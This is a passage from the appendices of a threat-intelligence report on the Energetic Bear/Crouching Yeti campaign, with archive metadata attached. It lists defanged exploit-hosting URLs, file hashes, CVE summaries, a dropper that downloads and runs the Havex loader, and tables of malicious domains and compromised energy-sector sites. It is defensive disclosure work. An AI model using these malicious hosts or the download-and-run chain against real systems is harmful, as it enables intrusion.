incident, KSN data recorded one origin of these exploits as:\n\nhxxp://keeleux.com/sfreg/img/nav/gami.jar and\nhxxp://keeleux.com/sfreg/img/nav/stoh.jar (ab580bd7a1193fe01855a6b8bd8f456b)\n\nThe file “stoh.jar” includes “DownloadExec.class”, which maintains a hardcoded string to the URL.\nThis string appears to be more commonly implemented at the active exploit sites:\n\nhxxp://keeleux.com/sfreg/img/nav/iden21php?dwl=fne\n\nIt writes out the TmpProvider.dll Havex loader downloaded from this resource and runs it using\n“rundll32.exe”.\n\neWON trojanized installer detail:\nhxxp://www.ewon.biz/software/eCatcher/eCatcherSetup.exe (eb0dacdc8b346f44c8c370408bad43\n06,70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9)\n\nHavex loader version 038\n(401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67) dropped as\nTmpProvider dll\n\n\n-----\n\n## 10.5. Related Targeted Software and CVE Entries\n\n**Internet Explorer**\nCVE-2013-1347\n[http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1347](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1347 )\n“Microsoft Internet Explorer 8 does not properly handle objects in memory, which allows remote\nattackers to execute arbitrary code by accessing an object that (1) was not properly allocated or (2)\nis deleted, as exploited in the wild in May 2013.”\n\nCVE-2012-1889\n[http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1889](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1889 )\n“Microsoft XML Core Services 3.0, 4.0, 5.0, and 6.0 accesses uninitialized memory locations, which\nallows remote attackers to execute arbitrary code or cause a denial of service (memory corruption)\nvia a crafted web site.”\n\n**Java**\nCVE-2013-1488\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1488](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1488 )\n“The Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier,\nand OpenJDK 6 and 7, allows remote attackers to execute arbitrary code via unspecified vectors\ninvolving reflection, Libraries, “improper toString calls,” and the JDBC driver manager, as\ndemonstrated by James Forshaw during a Pwn2Own competition at CanSecWest 2013.”\n\nCVE-2012-1723\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1723](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1723 )\n“Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE\n7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, and 1.4.2_37 and earlier\nallows remote attackers to affect confidentiality, integrity, and availability via unknown vectors\nrelated to Hotspot.”\n\nCVE-2012-5076\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-cve-2012-5076](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-cve-2012-5076 )\nUnspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7\nUpdate 7 and earlier allows remote attackers to affect confidentiality, integrity, and availability,\nrelated to JAX-WS.\n\nCVE-2013-2465\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-2465](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-2465 )\n“Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE\n\n\n-----\n\n7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK\n7, allows remote attackers to affect confidentiality, integrity, and availability via unknown\nvectors related to 2D. NOTE: the previous information is from the June 2013 CPU. Oracle has not\ncommented on claims from another vendor that this issue allows remote attackers to bypass the\nJava sandbox via vectors related to “Incorrect image channel verification” in 2D.”\n\nCVE-2013-2423\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-2423](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-2423 )\n“Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE\n7 Update 17 and earlier, and OpenJDK 7, allows remote attackers to affect integrity via unknown\nvectors related to HotSpot. NOTE: the previous information is from the April 2013 CPU. Oracle\nhas not commented on claims from the original researcher that this vulnerability allows remote\nattackers to bypass permission checks by the MethodHandles method and modify arbitrary public\nfinal fields using reflection and type confusion, as demonstrated using integer and double fields to\ndisable the security manager.”\n\nCVE-2012-4681\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-4681](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-4681)\nMultiple vulnerabilities in the Java Runtime Environment (JRE) component in Oracle Java SE 7\nUpdate 6 and earlier allow remote attackers to execute arbitrary code via a crafted applet that\nbypasses SecurityManager restrictions by (1) using com.sun.beans.finder.ClassFinder.findClass\nand leveraging an exception with the forName method to access restricted classes from arbitrary\npackages such as sun.awt.SunToolkit, then (2) using “reflection with a trusted immediate caller” to\nleverage the getField method to access and modify private fields, as exploited in the wild in August\n2012 using Gondzz.class and Gondvv.class.\n\nCVE-2013-0422\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-cve-2013-0422](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-cve-2013-0422)\nMultiple vulnerabilities in Oracle Java 7 before Update 11 allow remote attackers to execute\narbitrary code by (1) using the public getMBeanInstantiator method in the JmxMBeanServer class to\nobtain a reference to a private MBeanInstantiator object, then retrieving arbitrary Class references\nusing the findClass method, and (2) using the Reflection API with recursion in a way that bypasses\na security check by the java.lang.invoke.MethodHandles.Lookup.checkSecurityManager method\ndue to the inability of the sun.reflect.Reflection.getCallerClass method to skip frames related to the\nnew reflection API, as exploited in the wild in January 2013, as demonstrated by Blackhole and\nNuclear Pack, and a different vulnerability than CVE-2012-4681 and CVE-2012-3174. NOTE: some\nparties have mapped the recursive Reflection API issue to CVE-2012-3174, but CVE-2012-3174 is for\na different vulnerability whose details are not public as of 20130114. CVE-2013-0422 covers both\nthe JMX/MBean and Reflection API issues. NOTE: it was originally reported that Java 6 was also\nvulnerable but the reporter has retracted this claim stating that Java 6 is not exploitable because\n\n\n-----\n\nthe relevant code is called in a way that does not bypass security checks. NOTE: as of 20130114, a\nreliable third party has claimed that the findClass/MBeanInstantiator vector was not fixed in Oracle\nJava 7 Update 11. If there is still a vulnerable condition, then a separate CVE identifier might be\ncreated for the unfixed issue.\n\n**Mozilla Firefox**\nCVE-2013-1690\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-1690](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-1690)\n“Mozilla Firefox before 22.0, Firefox ESR 17.x before 17.0.7, Thunderbird before 17.0.7, and\nThunderbird ESR 17.x before 17.0.7 do not properly handle onreadystatechange events in\nconjunction with page reloading, which allows remote attackers to cause a denial of service\n(application crash) or possibly execute arbitrary code via a crafted web site that triggers an attempt\nto execute data at an unmapped memory location.”\n\n**Adobe Reader**\nCVE-2010-2883\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-2883](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-2883 )\nStack-based buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4, and 8.x\nbefore 8.2.5 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause\na denial of service (application crash) via a PDF document with a long field in a Smart INdependent\nGlyphlets (SING) table in a TTF font, as exploited in the wild in September 2010. NOTE: some of\nthese details are obtained from third party information.\n\n\n-----\n\n# XI. Appendix 11: Malicious Domains and Redirectors\n\n\n**Client**\n**Approximately**\n**Exploit URL** **side** **CVE**\n**Active**\n**software**\n\n\n2013.06 parkour.kz/wp-content/plugins/checkbot/kool.jar Java cve-2013-2465\n2013.12\nwww.nahoonservices.com/wp-content/plugins/rss- Internet 2013.07 cve-2013-1347\nposter/negc.html Explorer 2013.08\nnahoonservices.com/wp-content/plugins/rss-poster/ Adobe\ncve-2010-2883 2012.12\njungle.pdf Reader\n\nnahoonservices.com/wp-content/plugins/rss-poster/\nJava cve-2013-0422 2013.05\ndirect.jar\n\nwaytomiracle.com/physics/wp-content/plugins/\nJava cve-2013-2465 2014.01\nakismet/kool.jar\n\nkenzhebek.com/tiki/files/templates/listpages/start. 2013.05 Java cve-2013-2423\njar 2013.09\nkenzhebek.com/tiki/files/templates/listpages/negc. Internet\ncve-2013-1347 2013.05\nhtml Explorer\n\nkenzhebek.com/tiki/files/templates/listpages/negq. Internet\ncve-2013-1347 2013.08\nhtml Explorer\n\nkenzhebek.com/tiki/files/templates/listpages/stoq. 2013.05 Java cve-2012-1723\njar 2013.09\n\nkeeleux.com/sfreg/img/nav/leks.jar Java cve-2012-1723 2013.08\n\nwww.nahoonservices.com/wp-content/plugins/rssJava cve-2013-1488 2013.07\nposter/start.jar\n\nwww.nahoonservices.com/wp-content/plugins/rssJava cve-2012-5076 2012.12\nposter/dgoat.jar\n\nadultfriendgermany.com/wp-content/plugins/\nJava cve-2012-5076 2013.02\ngoogle-analytics-for-wordpress/etihu.jar\n\nadultfriendfrance.com/wp-includes/pomo/Applet.jar Java cve-2012-1723 2013.02\n\nlafollettewines.com/blog/wp-includes/pomo/direct.\nJava cve-2013-0422 2013.02\njar\n\n\nlafollettewines.com/blog/wp-includes/pomo/leks.jar Java cve-2012-1723 2013.02\n\n\n-----\n\n**Client**\n**Approximately**\n**Exploit URL** **side** **CVE**\n**Active**\n**software**\n\n\nroxsuite.com/components/com_search/views/\nJava cve-2012.4681 2013.11\nsearch/tmpl/outstat.jar\n\nclaudia.dmonzon.com/wp-content/plugins/jetpack/_\nJava cve-2012-4681 2013.11\ninc/Outstat.jar\n\naziaone.com/wp-includes/pomo/Outstatsf.jar Java cve-2012-4681 2012.09\n\nroxsuite.com/includes/phpmailer/bara.jar Java cve-2012-1723 2012.08\n\nserviciosglobal.com/classes/kool.jar Java cve-2013-2465 2013.11\n\nmohsenmeghdari.com/addons/_defensio/leks.jar Java cve-2012-1723 2013.10\n\nInternet\nmohsenmeghdari.com/addons/_defensio/negc.html cve-2013-1347 2013.09\nExplorer\n\nmahsms.ir/wp-includes/pomo/srgh.php?a=r2 Java cve-2013-2465 2014.01\n\ncum-filled-trannys.com/wp-includes/pomo/Deliver.\nJava cve-2012-4681 2012.08\njar\n\nwoman-site.com/modules/mod_search/stoh.jar Java cve-2012-1723 2013.11\n\n\n-----\n\n**Approximately**\n**Compromised Referrer** **Referrer Profile** **Exploit Site**\n**Active**\n\n\ngse.com.ge\n\ngamyba.le.lt\n\nutilico.co.uk\n\n\nGeorgian State Electrosystem\n(GSE) - 100% state-owned\njoint stock company providing\ntransmission and exclusive\ndispatch services to about 50\neligible companies in Georgia\n\nLietuvos energijos gamyba Lithuania‘s largest electricity\ngenerating company, which\ncombines all state-operated\nelectricity generating capacities\n\nInvestment company “significant proportion of\nits Gross Assets invested in\ndeveloped markets in existing\nutilities and related stocks,\nincluding...water and sewerage\ncompanies, waste, electricity,\ngas, telecommunications, ports,\nairports, service companies,\nrail, roads, any business with\n\nessential service or monopolistic\ncharacteristics and in any new\nutilities”;\nChairman - “has many years’\nexperience in the international\nutility sector, playing a major\nrole in the restructuring and\nprivatization of the UK electricity\nindustry”\n\n\nlafollettewines.\n2013 Q1\ncom\n\nlafollettewines.\n2013 Q3\ncom\n\nnahoonservices. 2012 Q4 - 2013\ncom Q1\n\n\nGeorgian Yellow Pages, maintains nahoonservices. 2012 Q4 - 2013\nyell.ge\nManganese mining org contacts com Q1\n\n\nchariotoilandgas.com\n\n\nChariot Oil and Gas Limited\n\n- independent oil and gas\nexploration company with\ninterests in Namibia and\nMauritania\n\n\nnahoonservices. 2012 Q4 - 2013\ncom Q1\n\n\n-----\n\n**Approximately**\n**Compromised Referrer** **Referrer Profile** **Exploit Site**\n**Active**\n\n\n2012 Q4 - 2013\nQ1\n\n\nlongreachoilandgas.com\n\n\nLongreach Oil & Gas Ltd. - fast\ngrowing oil and gas exploration\ncompany, with significant license\ninterest in onshore and offshore\nMorocco\n\n\nnahoonservices.\ncom\n\n\nstrainstall.com\n\njfaerospace.com\n\n\nFor more than 45 years Strainstall\nhas helped industries worldwide\nto operate safely by ensuring\nthat structures, equipment and\ninfrastructure are safe to use.\nWe have developed world-class\nsystems to monitor physical and\nperformance parameters such\nas load, stress, temperature,\nacceleration, pressure and\ndisplacement\n\nJames Fisher Aerospace (JFA)\nis an internationally respected\naerospace project organization,\nwith an extensive multi-skilled\nengineering design and global\n\nsupply capability supporting\nmilitary and civil aerospace\nindustries\nFormerly known as JF Faber,\nthe company’s expertise and\nexperience includes extensive\nprojects in aerospace as well as in\na variety of other high integrity\nindustries\n\n\nnahoonservices. 2012 Q4 - 2013\ncom Q1\n\nnahoonservices. 2012 Q4 - 2013\ncom Q1\n\n\nFrench-based gas distributor, serviciosglobal.\nvitogaz.com 2013 Q4\nsupplier and technical developer com\n\nFrench-based gas distributor,\nvitogaz.com keeleux.com 2013 Q4\nsupplier and technical developer\n\n\nCalifornia-based industrial\nbsicomputer.com computer systems manufacturer\nand developer\n\n\nserviciosglobal.\n2013 Q4\ncom\n\n\n-----\n\n**Approximately**\n**Compromised Referrer** **Referrer Profile** **Exploit Site**\n**Active**\n\n\nenergyplatform.eu\n\n\nFrench-based RBF, Renewables\nBusiness Facilitator - organization\nrepresenting 200 renewable\nenergy research centers and\nbusinesses\n\n\nserviciosglobal.\n2013 Q4\ncom\n\n\nfirstenergy.com\n\nfirstenergy.com\n\nwww.energo-pro.ge\n\nenergo-pro.ge\n\ngritech.fr\n\n\nFirstEnergy Capital - Calgary\nbased investment banking\nprovider. Financial, advisory and\ninvestment services to the global\nenergy sector\n\nFirstEnergy Capital - Calgary\nbased investment banking\nprovider. Financial, advisory and\ninvestment services to the global\nenergy sector\n\nEnergy Pro Georgia - one of the\nbiggest energy companies in the\nregion...vast investments in the\ndevelopment and maintenance\nof company owned renewable\nenergy objects, rehabilitation of\ngrid infrastructure and service\nimprovement\n\nEnergy Pro Georgia - one of the\nbiggest energy companies in the\nregion...vast investments in the\ndevelopment and maintenance\nof company owned renewable\nenergy objects, rehabilitation of\ngrid infrastructure and service\nimprovement\n\nGritecH - engineering company\nin the field of high voltage and\ncomputing power transmission\nsteel structures\n\n\nserviciosglobal.\n2013 Q4\ncom\n\nkenzhebek.com 2013 Q3\n\nkenzhebek.com 2013 Q2, Q3\n\nkeeleux.com 2013 Q2\n\nkeeleux.com 2013 Q4\n\n\n-----\n\n**Approximately**\n**Compromised Referrer** **Referrer Profile** **Exploit Site**\n**Active**\n\n\nwaytomiracle.\n2014 Q1\ncom\n\nwaytomiracle.\n2014 Q1\ncom\n\nserviciosglobal.\n2013 Q4\ncom\n\n\nrare.fr\n\n\nkeeleux.com 2013 Q4\n\n\nused.samashmusic.com\n\nsbmania.net\n\n\nRéseau national des Agences\nRégionales de l’Energie et de\nl’Environnement - brings together\n12 partners… Operational\npartnerships have been\nestablished with the Ministry\nof Ecology, Energy, Sustainable\nDevelopment and the Sea...\nADEME and the network of local\nenergy agencies (FLAME)\n\nUS-based website - used musical\ninstrument stores located across\nthe US. Frequently emails\npotential customers with links to\nsite\n\nSponge Bob fan site SpongeBuddy\nMania - includes a forum where\nindividuals can be specifically\ntargeted, including adults\n\n\nBritish based global advisers 39essex.com legal mediation and advocacy,\npolicy and business advice\n\n\nFrench-based weather forecasting serviciosglobal.\nmeteo.orange.fr 2013 Q4\nfor Saint Gervais, FR com\n\n\nenergyplatform.eu\n\n\nFrench-based RBF, Renewables\nBusiness Facilitator - organization\nrepresenting 200 renewable\nenergy research centers and\nbusinesses\n\n\nwoman-site.com 2013 Q4\n\n\ngritech.fr\n\n\nGritecH - engineering company\nin the field of high voltage and\ncomputing power transmission\nsteel structures\n\n\nwoman-site.com 2013 Q4\n\n\n-----\n\n**Approximately**\n**Compromised Referrer** **Referrer Profile** **Exploit Site**\n**Active**\n\n\nvitoreseau.com\n\n\n“So far the only collective\nalternative energy natural gas was\nelectricity. Now, with the solution\n‘VITORESEAU’ choice exists.\nVITOGAZ gives your town a safe,\nefficient and economical to the\nproblem of gas supply places\ninaccessible to traditional city gas\nresponse.”\n\n\nmahsms.ir 2014 Q1\n\n\n-----\n\n# XII. Appendix 12: Previous and parallel research\n\nENERGY WATERING HOLE ATTACK USED LIGHTSOUT EXPLOIT KIT, Threatpost\n[http://threatpost.com/energy-watering-hole-attack-used-lightsout-exploit-kit](http://threatpost.com/energy-watering-hole-attack-used-lightsout-exploit-kit )\n[http://threatpost.com/energy-watering-hole-attack-used-lightsout-exploit-kit](http://threatpost.com/energy-watering-hole-attack-used-lightsout-exploit-kit )\n\nWatering-Hole Attacks Target Energy Sector, Cisco Security\n[http://blogs.cisco.com/security/watering-hole-attacks-target-energy-sector/](http://blogs.cisco.com/security/watering-hole-attacks-target-energy-sector/ )\n\nGlobal Threat Report 2013, Crowdstrike\n[http://www.crowdstrike.com/sites/all/themes/crowdstrike2/css/imgs/platform/CrowdStrike_](http://www.crowdstrike.com/sites/all/themes/crowdstrike2/css/imgs/platform/CrowdStrike_Global_Threat_Report_2013.pdf)\n[Global_Threat_Report_2013.pdf](http://www.crowdstrike.com/sites/all/themes/crowdstrike2/css/imgs/platform/CrowdStrike_Global_Threat_Report_2013.pdf)\n\nTalk2M Incident Report, [30-01-2014], eWON\n“The eWON commercial website www.ewon.biz has been attacked. A corrupted eCatcherSetup.exe\nfile has been placed into the CMS (Content Management System) of www.ewon.biz website and\neCatcher download hyperlinks have been rerouted to this corrupted file.“\n[http://www.talk2m.com/en/full_news.html?cmp_id=7&news_id=51](http://www.talk2m.com/en/full_news.html?cmp_id=7&news_id=51 )\n\nLightsOut EK: “By the way... How much is the fish!?”, Malwageddon\n\n[http://malwageddon.blogspot.ru/2013/09/unknown-ek-by-way-how-much-is-fish.html](http://malwageddon.blogspot.ru/2013/09/unknown-ek-by-way-how-much-is-fish.html )\n\nLightsOut EK Targets Energy Sector, Zscalar Threatlab\n[http://research.zscaler.com/2014/03/lightsout-ek-targets-energy-sector.html](http://research.zscaler.com/2014/03/lightsout-ek-targets-energy-sector.html )\n\nAdvisory (ICSA-14-178-01), ICS Focused Malware, ICS-CERT\n[http://ics-cert.us-cert.gov/advisories/ICSA-14-178-01](http://ics-cert.us-cert.gov/advisories/ICSA-14-178-01 )\n\n“havex-rat” [analysis], Gi0vann1 Sug4r\n[http://pastebin.com/2x1JinJd](http://pastebin.com/2x1JinJd )\n\n[analysis], @unixfreaxjp\n[http://pastebin.com/raw.php?i=qCdMwtZ6](http://pastebin.com/raw.php?i=qCdMwtZ6 )\n\nHello, a new specifically covered exploit kit, Snort VRT\n[http://vrt-blog.snort.org/2014/03/hello-new-exploit-kit.html](http://vrt-blog.snort.org/2014/03/hello-new-exploit-kit.html )\n\n\n-----\n\nContinued analysis of the LightsOut Exploit Kit, Snort VRT\n[http://vrt-blog.snort.org/2014/05/continued-analysis-of-lightsout-exploit.html](http://vrt-blog.snort.org/2014/05/continued-analysis-of-lightsout-exploit.html )\n[http://vrt-blog.snort.org/2014/05/continued-analysis-of-lightsout-exploit.html](http://vrt-blog.snort.org/2014/05/continued-analysis-of-lightsout-exploit.html )\n\nAn Overview of Exploit Packs (Update 20) Jan 2014, Mila, Contagio\n[http://contagiodump.blogspot.com/2010/06/overview-of-exploit-packs-update.html](http://contagiodump.blogspot.com/2010/06/overview-of-exploit-packs-update.html )\n\nHavex Hunts For ICS/SCADA Systems, f-secure\n[http://www.f-secure.com/weblog/archives/00002718.html](http://www.f-secure.com/weblog/archives/00002718.html )\n\nDragonfly: Cyberespionage Attacks Against Energy Suppliers, Symantec\n[http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf)\n[Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf)\n\nCCIRC Operational Summary - REPORTING PERIOD: FEBRUARY 16, 2014 – MARCH 1, 2014\n“Targeted attacks against Canadian energy sector”, Canadian Cyber Incident Response Centre\n[http://origin.library.constantcontact.com/download/get/file/1102733644597-691/CCIRC+-](http://origin.library.constantcontact.com/download/get/file/1102733644597-691/CCIRC+-+Operational+Summary+-+16February+2014+to+1+March+_2.pdf)\n[+Operational+Summary+-+16February+2014+to+1+March+_2.pdf](http://origin.library.constantcontact.com/download/get/file/1102733644597-691/CCIRC+-+Operational+Summary+-+16February+2014+to+1+March+_2.pdf)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/90zdh7pfbmon8mtea3okbc6s83ro28bx",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.07.31.Energetic_Bear/Kaspersky_Lab_crouching_yeti_appendixes_eng_final.pdf",
        "https://papers.vx-underground.org/papers/ICS SCADA/Havex/Energetic Bear - Crouching Yeti - Appendices.pdf"
    ],
    "report_names": [
        "Kaspersky_Lab_crouching_yeti_appendixes_eng_final",
        "Energetic Bear - Crouching Yeti - Appendices.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "37941e7c-1966-4afa-b116-753e19e72808",
            "created_at": "2022-10-25T16:07:23.321195Z",
            "updated_at": "2025-03-27T02:02:09.735994Z",
            "deleted_at": null,
            "main_name": "APT 5",
            "aliases": [
                "APT 5",
                "Bronze Fleetwood",
                "Keyhole Panda",
                "Mulberry Typhoon",
                "Poisoned Flight",
                "TEMP.Bottle",
                "TG-2754"
            ],
            "source_name": "ETDA:APT 5",
            "tools": [
                "LEOUNCIA",
                "shoco"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041499,
    "ts_creation_date": 1406812449,
    "ts_modification_date": 1406812453,
    "files": {
        "pdf": "https://archive.orkl.eu/a53ce340535461cc92e274f7c5bfb0d8653d5087.pdf",
        "text": "https://archive.orkl.eu/a53ce340535461cc92e274f7c5bfb0d8653d5087.txt",
        "img": "https://archive.orkl.eu/a53ce340535461cc92e274f7c5bfb0d8653d5087.jpg"
    }
}